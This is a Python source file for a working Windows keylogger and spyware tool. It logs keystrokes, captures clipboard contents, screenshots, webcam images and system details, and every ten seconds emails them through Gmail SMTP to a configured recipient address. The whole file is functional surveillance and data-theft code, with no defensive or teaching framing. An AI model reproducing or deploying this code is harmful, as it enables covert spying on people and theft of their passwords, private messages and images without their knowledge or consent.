# Python Libraries
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
from pynput.keyboard import Key, Listener
import win32clipboard
import time
from PIL import ImageGrab
import cv2

keystrokes = "keystrokes.txt"
system_information = "system.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
webcam_information = "webcam.png"

EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_16_digit_app_password"
to_address = "destination_email_address@gmail.com"

file_path = "C:\\your\\file\\path"
extend = "\\"


def send_email():
    try:
        # Create a MIMEMultipart object
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = to_address
        msg['Subject'] = "Keylogger Report"

        # Attach a message
        body = "Please find the attached Keylogger files."
        msg.attach(MIMEText(body, 'plain'))

        # Attach the keystrokes file
        attachment = open(file_path + extend + keystrokes, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= " + keystrokes)
        msg.attach(part)

        # Attach the system information file
        system_attachment = open(file_path + extend + system_information, "rb")
        system_part = MIMEBase('application', 'octet-stream')
        system_part.set_payload((system_attachment).read())
        encoders.encode_base64(system_part)
        system_part.add_header('Content-Disposition', "attachment; filename= " + system_information)
        msg.attach(system_part)

        # Attach the clipboard file
        clipboard_attachment = open(file_path + extend + clipboard_information, "rb")
        clipboard_part = MIMEBase('application', 'octet-stream')
        clipboard_part.set_payload(clipboard_attachment.read())
        encoders.encode_base64(clipboard_part)
        clipboard_part.add_header('Content-Disposition', "attachment; filename= " + clipboard_information)
        msg.attach(clipboard_part)

        # Attach the screenshot file
        screenshot_attachment = open(file_path + extend + screenshot_information, "rb")
        screenshot_part = MIMEBase('application', 'octet-stream')
        screenshot_part.set_payload((screenshot_attachment).read())
        encoders.encode_base64(screenshot_part)
        screenshot_part.add_header('Content-Disposition', "attachment; filename= " + screenshot_information)
        msg.attach(screenshot_part)

        # Attach the webcam image file
        webcam_attachment = open(file_path + extend + webcam_information, "rb")
        webcam_part = MIMEBase('application', 'octet-stream')
        webcam_part.set_payload((webcam_attachment).read())
        encoders.encode_base64(webcam_part)
        webcam_part.add_header('Content-Disposition', "attachment; filename= " + webcam_information)
        msg.attach(webcam_part)

        # Connect to the SMTP server and send the email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, to_address, text)
        server.quit()

        with open(file_path + extend + keystrokes, "w"):
            pass  # Open and immediately close the file to clear its content

        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")


# Define a function to send email with updated information
def send_periodic_email():
    while True:
        print("Sending email...")
        clipboard()
        screenshot()
        webcam_capture()
        computer_information()
        send_email()
        time.sleep(10)  # Wait for 10 seconds before sending the next email


def computer_information():
    with open(file_path + extend + system_information, "w") as f:
        hostname = socket.gethostname()
        IP_Address = socket.gethostbyname(hostname)

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + (platform.system() + "" + platform.version() + '\n'))
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IP_Address + '\n')


def clipboard():
    try:
        with open(file_path + extend + clipboard_information, "w") as f:
            win32clipboard.OpenClipboard()
            pasted = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: " + str(pasted))
    except Exception as e:
        print(f"Error accessing clipboard: {e}")


def screenshot():
    try:
        with open(file_path + extend + screenshot_information, "wb") as f:
            img = ImageGrab.grab()  # Capture the screenshot
            img.save(screenshot_information)  # Save the new screenshot
    except Exception as e:
        print(f"Error capturing screenshot: {e}")


def webcam_capture():
    try:
        # Initialize the webcam
        cap = cv2.VideoCapture(0)

        # Check if the webcam is opened successfully
        if not cap.isOpened():
            print("Error: Could not open webcam.")
            return

        # Capture a frame from the webcam
        ret, frame = cap.read()

        # If the frame is captured successfully, save it
        if ret:
            cv2.imwrite(file_path + extend + webcam_information, frame)
            print("Webcam image captured successfully.")
        else:
            print("Error: Failed to capture webcam image.")

        # Release the webcam
        cap.release()

    except Exception as e:
        print(f"Error capturing webcam image: {e}")


count = 0
keys = []

caps_lock_pressed = False


def on_press(key):
    global keys, count, caps_lock_pressed
    print(key)
    if key == Key.enter:
        keys.append('\n')  # Append newline character
    # Check if Caps Lock key is pressed
    if key == Key.caps_lock:
        caps_lock_pressed = not caps_lock_pressed

    if key == Key.space:
        keys.append(' ')
    else:
        keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keystrokes, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                # Convert to uppercase if Caps Lock is pressed
                if caps_lock_pressed:
                    k = k.upper()
                f.write(k)


def on_release(key):
    if key == Key.esc:
        print("Sending email...")
        clipboard()
        screenshot()
        webcam_capture()
        send_email()
        return False


# Start sending emails periodically in a separate thread
email_thread = threading.Thread(target=send_periodic_email)
email_thread.daemon = True  # Set the thread as daemon so it terminates when the main thread exits
email_thread.start()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
